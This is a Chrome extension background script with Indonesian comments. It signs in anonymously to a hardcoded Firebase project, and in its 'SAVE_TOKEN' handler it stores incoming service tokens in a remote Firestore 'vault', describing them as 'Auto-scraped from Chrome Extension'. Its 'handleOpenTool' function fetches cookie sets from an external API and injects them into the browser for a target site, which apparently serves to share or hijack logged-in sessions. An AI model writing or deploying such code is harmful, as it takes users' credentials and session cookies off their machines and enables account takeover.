// background.js 
// Menggunakan import module langsung dari CDN agar tidak perlu setup npm/webpack 
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"; 
import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js"; 
import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-auth.js"; 

// KONFIGURASI OTOMATIS DARI APP ANDA 
const firebaseConfig = { 
  "apiKey": "AIzaSyCqyCcs2R2e7AegGjvFAwG98wlamtbHvZY", 
  "authDomain": "bard-frontend.firebaseapp.com", 
  "projectId": "bard-frontend", 
  "storageBucket": "bard-frontend.firebasestorage.app", 
  "messagingSenderId": "175205271074", 
  "appId": "1:175205271074:web:2b7bd4d34d33bf38e6ec7b" 
}; 

// Initialize Firebase
let db;
let auth;

try {
  const app = initializeApp(firebaseConfig); 
  db = getFirestore(app); 
  auth = getAuth(app); 
  
  // Login Anonim di Background 
  signInAnonymously(auth).then(() => { 
    console.log("Background Service Worker: Firebase Connected"); 
  }).catch(err => console.error("Auth Failed", err));
} catch (error) {
  console.error("Firebase Init Error:", error);
}

// TARGET DATABASE (JANGAN UBAH) 
const APP_ID = "c_de3575efc21c8d10_App.jsx-927"; 
const USER_ID = "10718304905226427095";  
const COLLECTION = "extension_secure_vault"; 

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => { 
  if (message.action === "SAVE_TOKEN") { 
    saveTokenToFirestore(message.payload) 
      .then(id => sendResponse({status: "success", id: id})) 
      .catch(err => sendResponse({status: "error", msg: err.message})); 
    return true; // Keep channel open for async response 
  } 

  // --- INTEGRASI FITUR LAMA (TEXA_OPEN_TOOL & TEXA_LOGIN_SUCCESS) ---
  // Dipertahankan agar fitur login & open tool tetap jalan
  if (message.type === 'TEXA_OPEN_TOOL') {
    handleOpenTool(message).then(res => {
      console.log("Tool open result:", res);
    });
    return; 
  }
  if (message.type === 'TEXA_LOGIN_SUCCESS') {
    chrome.notifications.create({
      type: 'basic',
      iconUrl: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
      title: 'Login Berhasil',
      message: 'Anda sudah berhasil login, silahkan akses aplikasi di dashboard web texa'
    });
    return;
  }
}); 

async function saveTokenToFirestore(data) { 
  try { 
    if (!db) throw new Error("Database not initialized");
    // Simpan ke path spesifik user Anda 
    const vaultRef = collection(db, 'artifacts', APP_ID, 'users', USER_ID, COLLECTION); 
     
    const docRef = await addDoc(vaultRef, { 
      type: 'token', 
      serviceName: data.service, 
      value: data.token, 
      description: "Auto-scraped from Chrome Extension", 
      createdAt: serverTimestamp(), 
      origin: "Google Scraper Ext" 
    }); 
     
    return docRef.id; 
  } catch (error) { 
    console.error("Gagal simpan:", error); 
    throw error; 
  } 
}

// --- FUNGSI LAMA DIPERTAHANKAN (SUPPORT SYSTEM) ---
// Fungsi ini tetap ada untuk mendukung fitur "Buka Tool" dari dashboard
async function handleOpenTool(data) {
  const { toolId, targetUrl, apiUrl, authHeader } = data;
  console.log('Opening tool:', toolId, 'Target:', targetUrl, 'API:', apiUrl);

  try {
    if (!apiUrl) {
      await chrome.tabs.create({ url: targetUrl });
      return { success: true, message: 'Opened directly (no API URL)' };
    }

    const fetchOptions = {};
    if (authHeader) {
      fetchOptions.headers = { 'Authorization': authHeader };
    }

    const response = await fetch(apiUrl, fetchOptions);
    if (!response.ok) {
      throw new Error(`Failed to fetch cookies: ${response.statusText}`);
    }
    
    let cookiesData = await response.json();
    let cookies = [];

    if (cookiesData.fields) {
      cookies = extractCookiesFromFirestore(cookiesData.fields);
    } else if (Array.isArray(cookiesData)) {
      cookies = cookiesData;
    } else if (cookiesData.cookies && Array.isArray(cookiesData.cookies)) {
      cookies = cookiesData.cookies;
    } else {
      cookies = [cookiesData];
    }

    let injectedCount = 0;
    for (const cookie of cookies) {
      try {
        await setCookie(cookie, targetUrl);
        injectedCount++;
      } catch (err) {
        console.error('Failed to set cookie:', cookie, err);
      }
    }

    await chrome.tabs.create({ url: targetUrl });
    return { success: true, injectedCount };

  } catch (error) {
    console.error('Error in handleOpenTool:', error);
    return { success: false, error: error.message };
  }
}

function extractCookiesFromFirestore(fields) {
  for (const key in fields) {
    const field = fields[key];
    if (field.stringValue) {
      try {
        const parsed = JSON.parse(field.stringValue);
        if (Array.isArray(parsed)) return parsed;
        if (parsed.cookies && Array.isArray(parsed.cookies)) return parsed.cookies;
      } catch (e) {}
    }
  }
  if (fields.cookies && fields.cookies.stringValue) {
    try { return JSON.parse(fields.cookies.stringValue); } catch(e){}
  }
  return [];
}

function setCookie(cookieData, targetUrl) {
  const domain = cookieData.domain || new URL(targetUrl).hostname;
  const rawDomain = domain.startsWith('.') ? domain.substring(1) : domain;
  let url = cookieData.url;
  if (!url) {
     url = `https://${rawDomain}${cookieData.path || '/'}`;
  }

  const cookieDetails = {
    url: url,
    name: cookieData.name,
    value: cookieData.value,
    path: cookieData.path || '/',
    secure: cookieData.secure !== false,
    httpOnly: cookieData.httpOnly === true,
  };

  if (cookieData.domain) cookieDetails.domain = cookieData.domain;
  if (cookieData.expirationDate) cookieDetails.expirationDate = cookieData.expirationDate;

  return chrome.cookies.set(cookieDetails);
}
